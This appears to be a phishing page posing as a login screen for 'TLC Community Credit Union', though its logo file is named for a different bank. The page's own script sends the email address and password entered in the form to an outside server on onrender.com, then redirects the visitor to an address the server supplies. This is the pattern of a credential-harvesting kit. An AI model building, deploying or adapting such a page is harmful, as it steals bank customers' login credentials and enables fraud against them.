<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1"
    />
    <link rel="stylesheet" href="./public/style.css" />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"
    />
    <title>TLC Community Credit Union</title>
  </head>
  <body>
    <div class="container">
      <div class="imgDiv">
        <img
          src="./public/vermillion-state-bank-logo-8c7cd70b.png"
          alt="logo"
          width="250"
        />
      </div>
      <span style="color: rgb(131, 131, 160); text-align: center"
        >Enter your email address and password in the box below</span
      >
      <form id="myForm">
        <input
          type="email"
          name="email"
          id="email"
          placeholder="Email address"
          required
        />
        <input
          type="password"
          name="password"
          id="password"
          placeholder="Password"
          required
        />
        <br />
        <button type="button" id="loginBtn" class="proceed">Submit</button>
      </form>
    </div>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const loginBtn = document.getElementById("loginBtn");
        loginBtn.addEventListener("click", function (e) {
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;

          fetch("https://tlc-backend.onrender.com/email-submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ email, password }),
          })
            .then((response) => response.json())
            .then((data) => {
              window.location.href = data.redirectUrl;
            })
            .catch((error) => {
              console.error("Error:", error);
            });
        });
      });
    </script>
  </body>
</html>
